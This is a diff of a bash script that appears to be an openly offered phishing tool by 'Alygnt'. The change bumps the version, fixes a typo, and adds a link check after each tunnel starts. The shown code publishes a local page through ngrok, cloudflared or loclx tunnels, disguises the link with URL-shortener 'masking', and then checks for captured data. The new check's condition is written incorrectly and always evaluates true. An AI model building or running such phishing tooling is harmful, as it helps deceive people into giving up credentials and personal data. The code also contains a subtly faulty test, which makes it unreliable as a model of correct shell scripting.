@@ -56,7 +56,7 @@ cbanner(){
 	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
 	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
 	echo -e "${CYAN}        ${NC} "
-	echo -e "${GREEN}                           Version 1.1 ${NC}"
+	echo -e "${GREEN}                           Version 1.2 ${NC}"
 	echo -e "${CYAN}        ${NC} "
 }
 #Small Banner
@@ -286,7 +286,7 @@ MASKING() { #4 last one using url shortner apis
 			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
 		fi
 	else
-		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Erroe occured while masking try again"
+		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Error occured while masking try again"
 		sleep 5
 		cusurl
 	fi
@@ -330,6 +330,20 @@ cusurl(){
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
 	                { clear; banner; cusurl; }
                 esac
+}
+
+checklink() {
+	if [ ${LINK}=="" ]; then
+		clear
+		banner
+		echo " "
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
+		sleep 6
+		start_localhost
+	else
+		cusurl
+	fi
 }
 
 ## Install ngrok
@@ -410,7 +424,7 @@ start_ngrok() {
 ##        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
 	LINK="${ngrok_url}"
-	cusurl
+	checklink
         capture_data_check
 }
 
@@ -460,7 +474,7 @@ start_cloudflared() {
 
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
 	LINK="${cldflr_link}"
-	cusurl
+	checklink
         capture_data_check
 }
 
@@ -530,7 +544,7 @@ start_loclx() {
 	{ sleep 12; clear; banner; }
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
 	LINK="${loclx_url}"
-	cusurl
+	checklink
 	capture_data_check
 }
 
@@ -577,7 +591,7 @@ HOST='127.0.0.1'
 cusport() {
 	echo " "
 	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
-	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}" 
+	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}"
 	case $REPLY in
 	Y | y)
 		read -p "${RED}[${WHITE}?${RED}]${GREEN}Type your Custom port : ${BLUE}" cport
